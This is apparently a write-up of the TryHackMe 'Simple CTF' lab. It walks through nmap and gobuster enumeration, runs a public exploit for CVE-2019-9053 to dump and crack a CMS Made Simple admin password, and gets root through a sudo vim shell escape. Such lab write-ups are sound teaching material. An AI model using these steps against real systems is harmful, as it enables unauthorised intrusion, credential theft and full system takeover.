[![Needed-nmap](https://img.shields.io/badge/Needed-nmap-blue)](https://nmap.org/)
[![Needed-Gobuster](https://img.shields.io/badge/Needed-Gobuster-orange)](https://github.com/OJ/gobuster)

# Simple CTF

## Reconnaissance
As always we start by scanning target machine with nmap. The target responds to ICMP, so we don't need `-Pn` flag.<br>
The scan will be:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ sudo nmap -sC -sV 10.10.23.113 
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.65% done
Host is up (0.081s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.20.168
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We briefly look at the services:
- **Port 21**: ftp service. Anonymous fs is empty
- **Port 80**: Apache2 web server homepage. Nothing strange, but we will enumerate the URL for some more useful files
- **Port 2222**: SSH service. We don't know neither credentials nor SSH key

## Enumeration
Now we use gobuster to discover some hidden page hosted on the server:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt dir -u http://10.10.23.113 -x js,txt,py,
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.23.113
[+] Method:                  GET
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,txt,py,php
===============================================================
/robots.txt           (Status: 200) [Size: 929]
/simple               (Status: 301) [Size: 313] [--> http://10.10.23.113/simple/]
...
```

In `robots.txt` we find some (probably) useless license, but in `simple` directory we find a lot of interesting stuff:
```
┌──(marco㉿DellMarco)-[/mnt/f/kali]
└─$ gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt dir -u http://10.10.23.113/simple -x js,txt,py,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.23.113/simple
[+] Method:                  GET
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              js,txt,py,php
===============================================================
/index.php            (Status: 200) [Size: 19913]
/modules              (Status: 301) [Size: 321] [--> http://10.10.23.113/simple/modules/]
/uploads              (Status: 301) [Size: 321] [--> http://10.10.23.113/simple/uploads/]
/doc                  (Status: 301) [Size: 317] [--> http://10.10.23.113/simple/doc/]    
/admin                (Status: 301) [Size: 319] [--> http://10.10.23.113/simple/admin/]  
/assets               (Status: 301) [Size: 320] [--> http://10.10.23.113/simple/assets/] 
/lib                  (Status: 301) [Size: 317] [--> http://10.10.23.113/simple/lib/]    
/install.php          (Status: 301) [Size: 0] [--> /simple/install.php/index.php]        
/config.php           (Status: 200) [Size: 0]                                            
/tmp                  (Status: 301) [Size: 317] [--> http://10.10.23.113/simple/tmp/]
...
```

Just in `index.php` we find something interesting: this site is CMS Made Simple 2.2.8. CMS Made Simple isn't a really interesting service, but version 2.2.8 is vulnerable to SQL injection, so we can exploit it.

## SQL injection
On exploit-db we can find a short python exploit for [CVE-2019-9053](https://www.exploit-db.com/exploits/46635). Unfortunately it made me install python 2 to run it...<br>
Running it we get username, mail and password hash and salt ():
```
┌──(marco㉿DellMarco)-[/mnt/f/kali/TryHackMe/Simple_ctf]
└─$ python2 exploit_CVE-2019-9053.py -u http://10.10.34.6/simple/ --crack -w /usr/share/wordlists/rockyou.txt
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

With these credentials we can login both on CMS Made Simple login page and SSH. On mitch's home directory we can find the flag `user.txt`.<br>

## Root flag
The root flag `/root/root.txt` is obviously accessible only to root, but "we are" just an old ordinary mitch...<br>
The first move is to check sudo privileges:
```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

This response means that, as SuperUser, we can only run Vim, but we can do it without password! Seems pretty easy: we can open the flag with vim editor :)

## Root flag - V2
In case we didn't know where the flag is we can always use vim's ability to execute commands typing `:!bash`.